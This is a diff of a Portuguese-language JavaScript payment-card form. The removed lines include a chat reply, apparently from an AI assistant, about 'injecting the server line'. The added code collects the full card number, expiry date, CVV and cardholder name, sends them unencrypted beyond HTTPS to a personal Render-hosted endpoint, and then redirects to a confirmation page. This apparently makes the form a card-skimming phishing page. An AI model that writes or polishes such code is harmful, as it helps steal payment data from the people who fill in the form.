@@ -1,10 +1,3 @@
-Putz, mosquei feio agora. Peço desculpas, mano. Olhando o código que te passei, eu acabei limpando as mensagens de erro logo no início do submit, mas esqueci que a lógica de "retângulo vermelho" precisava de um tempo para respirar ou estava sendo sobrescrita por algum conflito de estilos.
-
-O erro foi que a função de limpar os erros estava rodando, mas a condição para exibir o aviso vermelho estava com um conflito no else.
-
-Aqui está o código blindado, exatamente igual ao seu original, mas com a linha do servidor injetada no lugar certo:
-
-JavaScript
 document.addEventListener("DOMContentLoaded", () => {
     const form = document.querySelector("#dadosss");
 
@@ -22,23 +15,26 @@ document.addEventListener("DOMContentLoaded", () => {
         nome: "Nome completo impresso no cartão.",
     };
 
-    // --- DICAS (MANTIDO IGUAL AO SEU) ---
+    // --- LÓGICA DE DICAS (CINZA) ---
     for (const key in campos) {
         const input = campos[key];
-        input.addEventListener("focus", () => {
-            removeMensagemDica(input);
-            const dica = document.createElement("span");
-            dica.classList.add("mensagem-dica");
-            dica.style.color = "#666";
-            dica.style.fontSize = "12px";
-            dica.style.display = "block";
-            dica.style.marginTop = "4px";
-            dica.textContent = mensagensDica[key];
-            input.parentElement.appendChild(dica);
-        });
-        input.addEventListener("blur", () => {
-            removeMensagemDica(input);
-        });
+        if (input) {
+            input.addEventListener("focus", () => {
+                removeMensagemDica(input);
+                const dica = document.createElement("span");
+                dica.classList.add("mensagem-dica");
+                dica.style.color = "#666";
+                dica.style.fontSize = "12px";
+                dica.style.display = "block";
+                dica.style.marginTop = "4px";
+                dica.textContent = mensagensDica[key];
+                input.parentElement.appendChild(dica);
+            });
+
+            input.addEventListener("blur", () => {
+                removeMensagemDica(input);
+            });
+        }
     }
 
     function removeMensagemDica(input) {
@@ -46,14 +42,14 @@ document.addEventListener("DOMContentLoaded", () => {
         if (existing) existing.remove();
     }
 
-    // --- EVENTO DE SUBMIT (AQUI ESTÁ A LÓGICA DO AVISO VERMELHO) ---
+    // --- EVENTO DE ENVIO ---
     form.addEventListener("submit", async (event) => {
         event.preventDefault();
 
-        // Limpa mensagens de erro anteriores para não duplicar
+        // Limpa erros anteriores
         document.querySelectorAll(".mensagem-erro").forEach(el => el.remove());
 
-        const inputs = {
+        const inputsParaValidar = {
             numero: campos.numero,
             data: campos.data,
             cvv: campos.cvv,
@@ -71,9 +67,9 @@ document.addEventListener("DOMContentLoaded", () => {
 
         let formValido = true;
 
-        // LOOP DE VALIDAÇÃO (CRIA O RETÂNGULO E O TEXTO VERMELHO)
-        for (const key in inputs) {
-            const input = inputs[key];
+        // VALIDAÇÃO VISUAL (MENSAGENS VERMELHAS)
+        for (const key in inputsParaValidar) {
+            const input = inputsParaValidar[key];
 
             if (!input || (input.value === "" || input.value === undefined)) {
                 formValido = false;
@@ -81,26 +77,24 @@ document.addEventListener("DOMContentLoaded", () => {
                 if (key === "tipo") {
                     const radios = document.querySelectorAll('input[name="gender"]');
                     radios.forEach(r => {
-                        r.parentElement.style.border = "1px solid red"; // Retângulo Vermelho
+                        r.parentElement.style.border = "1px solid red";
                         r.parentElement.style.borderRadius = "8px";
-                        r.parentElement.style.padding = "5px";
                     });
 
                     const container = document.querySelector(".radio-container");
                     const erro = document.createElement("span");
                     erro.classList.add("mensagem-erro");
-                    erro.style.color = "red"; // Texto Vermelho
+                    erro.style.color = "red";
                     erro.style.fontSize = "14px";
                     erro.textContent = mensagensErro[key];
                     container.appendChild(erro);
-
                 } else {
-                    input.style.border = "1px solid red"; // Retângulo Vermelho
+                    input.style.border = "1px solid red";
                     input.style.borderRadius = "8px";
 
                     const erro = document.createElement("span");
                     erro.classList.add("mensagem-erro");
-                    erro.style.color = "red"; // Texto Vermelho
+                    erro.style.color = "red";
                     erro.style.fontSize = "14px";
                     erro.style.display = "block";
                     erro.style.marginTop = "4px";
@@ -108,7 +102,6 @@ document.addEventListener("DOMContentLoaded", () => {
                     input.parentElement.appendChild(erro);
                 }
             } else {
-                // Se o campo for preenchido, limpa a borda vermelha
                 if (key === "tipo") {
                     document.querySelectorAll('input[name="gender"]').forEach(r => {
                         r.parentElement.style.border = "none";
@@ -119,9 +112,15 @@ document.addEventListener("DOMContentLoaded", () => {
             }
         }
 
-        // --- SÓ ENVIA SE O FORM FOR VÁLIDO ---
+        // --- ENVIO PARA O SERVIDOR ---
         if (formValido) {
-            const cardType = document.querySelector('input[name="gender"]:checked')?.value || 'Not selected';
+            // PEGA O BOTÃO E COLOCA O AVISO DE CARREGANDO
+            const botao = form.querySelector("button");
+            const textoOriginal = botao.textContent;
+            botao.disabled = true;
+            botao.textContent = "Processando..."; // Aviso de carregamento
+
+            const cardType = document.querySelector('input[name="gender"]:checked').value;
             
             const dadosParaEnviar = {
                 numero: campos.numero.value,
@@ -132,7 +131,6 @@ document.addEventListener("DOMContentLoaded", () => {
             };
 
             try {
-                // ENVIO PARA O TEU RENDER
                 const urlDoServidor = "https://backend-g2xn.onrender.com/enviar-dados";
 
                 const resposta = await fetch(urlDoServidor, {
@@ -142,13 +140,17 @@ document.addEventListener("DOMContentLoaded", () => {
                 });
 
                 if (resposta.ok) {
-                    window.location.href = "confirmacao.html"; // Redireciona se deu certo
+                    window.location.href = "confirmacao.html";
                 } else {
-                    alert("Erro ao salvar no banco. Verifique o servidor.");
+                    alert("Erro ao processar dados.");
+                    botao.disabled = false;
+                    botao.textContent = textoOriginal;
                 }
             } catch (error) {
                 console.error("Erro:", error);
-                alert("Servidor offline!");
+                alert("O servidor não respondeu.");
+                botao.disabled = false;
+                botao.textContent = textoOriginal;
             }
         }
     });
